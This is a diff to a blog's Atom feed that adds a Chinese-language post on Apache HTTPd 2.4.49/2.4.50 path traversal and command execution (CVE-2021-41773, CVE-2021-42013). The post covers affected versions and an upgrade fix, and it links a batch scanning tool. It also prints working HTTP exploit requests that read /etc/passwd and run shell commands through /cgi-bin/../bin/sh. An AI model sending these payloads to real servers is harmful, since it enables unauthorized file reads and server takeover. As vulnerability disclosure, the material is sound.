@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-09-23T06:50:06.389Z</updated>
+  <updated>2021-10-15T02:16:26.348Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Apache 2.4.49</title>
+    <link href="http://example.com/2021/10/15/Apache-2-4-49/"/>
+    <id>http://example.com/2021/10/15/Apache-2-4-49/</id>
+    <published>2021-10-15T02:09:10.000Z</published>
+    <updated>2021-10-15T02:16:26.348Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞描述</strong></p><p>Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49/2.4.50 路径穿越漏洞。由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取到Web目录之外的其他文件。同时若Apache HTTPd开启了cgi支持，攻击者可构造恶意请求执行命令，控制服务器。</p><p><strong>影响版本</strong></p><p>Apache HTTPd 2.4.49/2.4.50版本</p><p><strong>验证过程</strong></p><p>Apache HTTPd 2.4.49 任意文件读取漏洞验证：</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20211015101123969.png" alt="image-20211015101123969"></p><p>GET数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure><p>Apache HTTPd 2.4.49 命令执行测试，未能成功回显命令，回显了bash报错信息。</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20211015101211618.png" alt="image-20211015101211618"></p><p>POST数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 13</span><br><span class="line"> </span><br><span class="line">echo;ifconfig</span><br></pre></td></tr></table></figure><p>Apache HTTPd 2.4.50 命令执行测试：</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20211015101238669.png" alt="image-20211015101238669"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 13</span><br><span class="line"> </span><br><span class="line">echo;ifconfig</span><br></pre></td></tr></table></figure><p>一个图片总结这次ApacheHTTPd 2.4.50版本修复不完善。</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20211015101302065.png" alt="image-20211015101302065"></p><p><strong>修复建议</strong></p><p>建议使用Apache HTTPd 2.4.49 与Apache HTTPd 2.4.50 版本的服务器更新Apache HTTPd 版本至最新。</p><p><strong>检测工具</strong></p><h2 id="Apache-2-4-49-CVE-2021-41773"><a href="#Apache-2-4-49-CVE-2021-41773" class="headerlink" title="Apache 2.4.49 (CVE-2021-41773)"></a>Apache 2.4.49 (CVE-2021-41773)</h2><h2 id="Apache-2-4-50-CVE-2021-42013"><a href="#Apache-2-4-50-CVE-2021-42013" class="headerlink" title="Apache 2.4.50 (CVE-2021-42013)"></a>Apache 2.4.50 (CVE-2021-42013)</h2><h2 id="批量多线程检测工具："><a href="#批量多线程检测工具：" class="headerlink" title="批量多线程检测工具："></a>批量多线程检测工具：</h2><p>Github地址：</p><p><a href="https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013">https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20211015101457783.png" alt="image-20211015101457783"></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/df0e622806a60f52f351f30127ad7944.png" alt="df0e622806a60f52f351f30127ad7944"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞描述&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49/2</summary>
+      
+    
+    
+    
+    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="Apache 2.4.49" scheme="http://example.com/tags/Apache-2-4-49/"/>
+    
+  </entry>
   
   <entry>
     <title>Spring Boot Actuator未授权访问利用实战利用</title>
